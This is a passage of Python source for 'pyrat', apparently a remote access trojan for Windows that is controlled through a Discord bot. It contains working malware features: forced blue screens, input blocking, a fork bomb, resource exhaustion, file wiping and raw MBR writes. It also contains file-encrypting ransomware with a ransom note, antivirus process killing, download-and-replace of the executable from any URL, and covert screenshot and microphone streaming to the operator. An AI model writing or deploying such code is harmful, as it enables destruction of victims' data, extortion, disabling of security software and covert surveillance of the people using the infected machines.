def c_blackout(ctx):
    off = not ctx.raw.strip().lower().startswith("off")
    _u32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2 if off else -1)
    if off:
        p = WORK / "wall.jpg"
        if p.exists():
            ctypes.windll.user32.SystemParametersInfoW(20, 0, str(p), 3)
    _u32.BlockInput(off)
    return f"blackout {'on' if off else 'off'}"


@command("bluescreen", aliases=["bsod"], cat="chaos", desc="Trigger a blue screen")
def c_bsod(ctx):
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
    return "bsod"


@command("bsod_delay", cat="chaos", desc="Blue screen after n seconds", usage="bsod_delay <seconds>")
def c_bsod_delay(ctx):
    delay = float(ctx.raw or 30)

    def go():
        time.sleep(delay)
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

    threading.Thread(target=go, daemon=True).start()
    return f"bsod in {delay}s"


@command("forkbomb", cat="chaos", desc="Spawn many busy loops", usage="forkbomb [count]")
def c_forkbomb(ctx):
    n = int(ctx.raw) if ctx.raw.isdigit() else 30
    for _ in range(n):
        spawn("cmd.exe", ["/c", "for /l %i in (1,1,2000000000) do rem"])
    return f"{n} processes spawned"


def _burn(secs):
    t0 = time.time()
    x = 0.0
    while time.time() - t0 < secs:
        x += math.sqrt(random.random())


@command("cpuload", cat="chaos", desc="Max out the CPU", usage="cpuload [workers] [seconds]")
def c_cpuload(ctx):
    a = ctx.argv
    n = int(a[0]) if a else (os.cpu_count() or 4)
    secs = float(a[1]) if len(a) > 1 else 30.0
    for _ in range(n):
        multiprocessing.Process(target=_burn, args=(secs,), daemon=True).start()
    return f"{n} workers for {secs}s"


@command("memeat", cat="chaos", desc="Eat up RAM", usage="memeat <mb>")
def c_memeat(ctx):
    global _EAT
    mb = int(ctx.raw or 512)
    _EAT = [bytearray(1 << 20) for _ in range(mb)]
    return f"{mb} MB allocated"


@command("filleater", cat="chaos", desc="Fill up the disk", usage="filleater <path> <mb> [count]")
def c_filleater(ctx):
    a = ctx.argv
    if len(a) < 2:
        return "usage: .filleater C:\\temp 100 10"
    d = Path(a[0])
    mb = int(a[1])
    cnt = int(a[2]) if len(a) > 2 else 10
    blk = b"\0" * (1 << 20)
    for i in range(cnt):
        with open(d / f"pyrat_fill_{i}.bin", "wb") as f:
            for _ in range(mb):
                f.write(blk)
    return f"{cnt} files of {mb} MB in {d}"


@command("wipe", cat="chaos", desc="Overwrite then delete files", usage="wipe <path> [passes]")
def c_wipe(ctx):
    a = ctx.argv
    if not a:
        return "usage: .wipe <path> [passes]"
    p = Path(a[0])
    passes = int(a[1]) if len(a) > 1 else 1
    if p.is_dir():
        n = 0
        for dp, _, fs in os.walk(p):
            for f in fs:
                fp = Path(dp) / f
                sz = fp.stat().st_size
                with open(fp, "r+b") as fh:
                    for _ in range(passes):
                        fh.write(b"\0" * sz)
                        fh.seek(0)
                fp.unlink()
                n += 1
        return f"{n} files wiped"
    sz = p.stat().st_size
    with open(p, "r+b") as fh:
        for _ in range(passes):
            fh.write(b"\0" * sz)
            fh.seek(0)
    p.unlink()
    return "wiped"


@command("mbr", cat="chaos", desc="Dump or restore the MBR", usage="mbr [restore <file>]")
async def c_mbr(ctx):
    k32 = ctypes.windll.kernel32
    k32.CreateFileW.restype = ctypes.c_void_p

    def open_drive(access):
        h = k32.CreateFileW(r"\\.\PhysicalDrive0", access, 0x3, None, 3, 0, None)
        if h in (None, 0xFFFFFFFFFFFFFFFF):
            raise OSError("cannot open PhysicalDrive0 (admin required)")
        return ctypes.c_void_p(h)

    a = ctx.argv
    if a and a[0] == "restore":
        data = Path(a[1]).read_bytes()
        h = open_drive(0x40000000)
        w = ctypes.c_ulong()
        k32.WriteFile(h, data, len(data), ctypes.byref(w), None)
        k32.CloseHandle(h)
        return await ctx.reply(f"{w.value} bytes written to sector 0")
    h = open_drive(0x80000000)
    buf = ctypes.create_string_buffer(512)
    r = ctypes.c_ulong()
    k32.ReadFile(h, buf, 512, ctypes.byref(r), None)
    k32.CloseHandle(h)
    data = buf.raw[:r.value]
    (WORK / "mbr_backup.bin").write_bytes(data)
    await ctx.file(data, "mbr_backup.bin")
    await ctx.reply("sector 0 saved, restore with `.mbr restore mbr_backup.bin`")


RANSOM_NOTE = """All files have been encrypted with AES-256-GCM.
Encrypted files carry the .pyrat extension.
To restore them, run the decrypt command with the password."""


@command("ransom", cat="chaos", desc="Encrypt files in a folder", usage="ransom <path> [password]")
async def c_ransom(ctx):
    if not AES:
        return await ctx.reply("pycryptodome missing")
    a = ctx.argv
    if not a:
        return await ctx.reply("usage: .ransom C:\\Users\\me secret")
    root = Path(a[0]).expanduser()
    pwd = a[1] if len(a) > 1 else "pyrat"
    key = hashlib.sha256(pwd.encode()).digest()
    skip = {".pyrat", ".exe", ".dll", ".sys"}
    n = 0
    t0 = time.time()
    for dp, _, fs in os.walk(root):
        for f in fs:
            fp = Path(dp) / f
            if fp.suffix.lower() in skip:
                continue
            try:
                if fp.stat().st_size > 300_000_000:
                    continue
                nonce = os.urandom(12)
                ct, tag = AES.new(key, AES.MODE_GCM, nonce=nonce).encrypt_and_digest(fp.read_bytes())
                fp.write_bytes(b"PYRAT1" + nonce + tag + ct)
                fp.rename(str(fp) + ".pyrat")
                n += 1
            except Exception:
                pass
    (root / "_RANSOM_README.txt").write_text(RANSOM_NOTE, "utf-8")
    w = WORK / "wall.jpg"
    if w.exists() and WIN:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, str(w), 3)
    await ctx.reply(f"{n} files encrypted in {time.time() - t0:.1f}s\n"
                    f"password: `{pwd}`\nrestore: `.decrypt {root} {pwd}`")


@command("decrypt", cat="chaos", desc="Decrypt the encrypted files", usage="decrypt <path> [password]")
async def c_decrypt(ctx):
    a = ctx.argv
    if not a:
        return await ctx.reply("usage: .decrypt C:\\path password")
    root = Path(a[0]).expanduser()
    key = hashlib.sha256((a[1] if len(a) > 1 else "pyrat").encode()).digest()
    n = 0
    for dp, _, fs in os.walk(root):
        for f in fs:
            if not f.endswith(".pyrat"):
                continue
            fp = Path(dp) / f
            try:
                blob = fp.read_bytes()
                if blob[:6] != b"PYRAT1":
                    continue
                out = fp.with_suffix("")
                out.write_bytes(AES.new(key, AES.MODE_GCM, nonce=blob[6:18])
                                .decrypt_and_verify(blob[34:], blob[18:34]))
                fp.unlink()
                n += 1
            except Exception:
                pass
    await ctx.reply(f"{n} files restored")


@command("killav", cat="chaos", desc="Kill known antivirus processes")
def c_killav(ctx):
    if not psutil:
        return "psutil missing"
    avs = {"msmpeng.exe", "nissrv.exe", "avp.exe", "avastsvc.exe", "avastui.exe", "bdagent.exe",
           "ekrn.exe", "mbam.exe", "sophoshealth.exe", "mcshield.exe", "avguard.exe", "ccsvchst.exe"}
    out = []
    for p in psutil.process_iter(["name", "pid"]):
        try:
            if p.info["name"].lower() in avs:
                p.kill()
                out.append(f"{p.info['name']} ({p.info['pid']})")
        except Exception:
            pass
    return "\n".join(out) or "no av processes found"


@command("uninstall", cat="chaos", desc="Remove persistence and self-delete")
async def c_uninstall(ctx):
    c_persist(Ctx(ctx.msg, "persist", "remove"))
    if not FROZEN:
        return await ctx.reply("script mode, nothing to delete")
    exe = sys.executable
    bat = WORK / "uninstall.bat"
    bat.write_text(f'@echo off\r\n:loop\r\ntimeout /t 1 /nobreak >nul\r\n'
                   f'del "{exe}" >nul 2>&1\r\nif exist "{exe}" goto loop\r\n'
                   f'start "" "{exe}"\r\ndel "%~f0"\r\n', "utf-8")
    await ctx.reply("removing myself")
    spawn_bat(bat)
    threading.Timer(1.5, lambda: os._exit(0)).start()


@command("update", cat="chaos", desc="Update yourself from a URL", usage="update <url.exe>")
async def c_update(ctx):
    if not FROZEN:
        return await ctx.reply("exe build only")
    if not requests:
        return await ctx.reply("requests missing")
    data = await asyncio.to_thread(lambda: requests.get(ctx.raw, timeout=120).content)
    new = EXE_DIR / "pyrat_new.exe"
    new.write_bytes(data)
    bat = WORK / "update.bat"
    bat.write_text(f'@echo off\r\n:loop\r\ntimeout /t 1 /nobreak >nul\r\n'
                   f'move /y "{new}" "{sys.executable}" >nul 2>&1\r\n'
                   f'if not exist "{sys.executable}" goto loop\r\n'
                   f'start "" "{sys.executable}"\r\ndel "%~f0"\r\n', "utf-8")
    await ctx.reply(f"{human(len(data))} downloaded, replacing")
    spawn_bat(bat)
    threading.Timer(1.5, lambda: os._exit(0)).start()


@command("openurl", aliases=["website"], cat="chaos", desc="Open a URL in the browser", usage="openurl <url>")
def c_openurl(ctx):
    u = ctx.raw if ctx.raw.startswith("http") else "https://" + ctx.raw
    webbrowser.open(u)
    return u


class MicSource(discord.AudioSource):
    def __init__(self, device=None):
        self.p = pyaudio.PyAudio()
        info = (self.p.get_device_info_by_index(int(device)) if device is not None
                else self.p.get_default_input_device_info())
        self.rate = int(info.get("defaultSampleRate") or 48000)
        self.stream = self.p.open(format=pyaudio.paInt16, channels=1, rate=self.rate, input=True,
                                  input_device_index=int(info["index"]),
                                  frames_per_buffer=int(self.rate / 50))
        self.resample = self.rate != 48000

    def read(self):
        try:
            raw = self.stream.read(int(self.rate / 50), exception_on_overflow=False)
        except Exception as e:
            log.warning("mic read: %s", e)
            return b"\x00" * 3840
        if not numpy:
            return raw[:3840].ljust(3840, b"\x00")
        a = numpy.frombuffer(raw, dtype=numpy.int16)
        if not len(a):
            return b"\x00" * 3840
        if self.resample:
            a = numpy.interp(numpy.linspace(0, len(a) - 1, 960), numpy.arange(len(a)), a).astype(numpy.int16)
        else:
            a = a[:960]
            if len(a) < 960:
                a = numpy.pad(a, (0, 960 - len(a)))
        return numpy.repeat(a[:, None], 2, axis=1).reshape(-1).tobytes()

    def is_opus(self):
        return False

    def cleanup(self):
        for fn in (self.stream.stop_stream, self.stream.close, self.p.terminate):
            try:
                fn()
            except Exception:
                pass


def _start_stream():
    interval, mon, cid = STATE["stream_cfg"]
    old = STATE.get("stream")
    if old is not None:
        try:
            old.cancel()
        except Exception:
            pass

    async def loop():
        while True:
            ch = bot.get_channel(cid)
            if ch:
                try:
                    img = await asyncio.to_thread(_shot, mon)
                    buf = io.BytesIO()
                    img.save(buf, "JPEG", quality=70)
                    await ch.send(file=discord.File(io.BytesIO(buf.getvalue()),
                                                    filename=f"s_{datetime.now():%H%M%S}.jpg"))
                except Exception as e:
                    log.warning("stream: %s", e)
            await asyncio.sleep(interval)

    STATE["stream"] = asyncio.create_task(loop())


async def _heartbeat():
    while True:
        try:
            ch = SESSION_CHANNEL
            if ch:
                cpu = psutil.cpu_percent() if psutil else "?"
                ram = psutil.virtual_memory().percent if psutil else "?"
                await ch.edit(topic=f"{HOST} | up {uptime_str()} | cpu {cpu}% | "
                                    f"ram {ram}% | ws {round(bot.latency * 1000)}ms")
        except Exception as e:
            log.debug("heartbeat: %s", e)
        await asyncio.sleep(STATE["hb"])


def find_session_channel():
    for g in bot.guilds:
        for ch in g.text_channels:
            if ch.name == SESSION:
                return ch
    return None


def _cleanup_old_channels(current):
    pref = f"{HOST_SLUG}-{CLIENT_ID}-"
    for g in bot.guilds:
        for c in list(g.text_channels):
            if c.id != current.id and c.name.startswith(pref):
                try:
                    asyncio.create_task(c.delete(reason=f"{APP} stale session"))
                except Exception:
                    pass


@bot.event
async def on_ready():
    global SESSION_CHANNEL
    log.info("ready as %s, guilds=%s", bot.user, len(bot.guilds))
    old = STATE.get("hb_task")
    if old is not None:
        try:
            old.cancel()
        except Exception:
            pass
    STATE["hb_task"] = asyncio.create_task(_heartbeat())
    if STATE["stream_cfg"]:
        _start_stream()
    if SESSION_CHANNEL:
        return

    ch = find_session_channel()
    if ch is None:
        for g in bot.guilds:
            try:
                ch = await g.create_text_channel(
                    SESSION, topic=f"{APP} {VERSION} | {whoami()}@{HOST}")
            except Exception as e:
                log.warning("channel create in %s: %s", g, e)
                continue
            break
    if ch is None:
        log.warning("no writable guild/channel found")
        return
    SESSION_CHANNEL = ch
    try:
        await ch.send(f"```\n{APP} {VERSION} - client connected\n"
                      f"host    : {HOST} / {whoami()}\n"
                      f"session : {SESSION}\n"
                      f"opus    : {OPUS_OK} | nacl: {NACL_OK} | cmds: {len(REG)}\n"
                      f"prefix  : {PREFIX}  ({PREFIX}help)\n```")
    except Exception as e:
        log.warning("welcome message: %s", e)
    _cleanup_old_channels(ch)


if __name__ == "__main__":
    if TOKEN in ("", "DEIN_BOT_TOKEN_HIER"):
        print("bot token missing")
    log.info("starting %s %s", APP, VERSION)
    while True:
        SESSION_CHANNEL = None
        try:
            bot.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(bot.loop)
            bot.run(TOKEN, log_handler=None)
        except Exception as e:
            log.exception("bot crash: %s", e)
        finally:
            try:
                bot.loop.close()
            except Exception:
                pass
        time.sleep(5)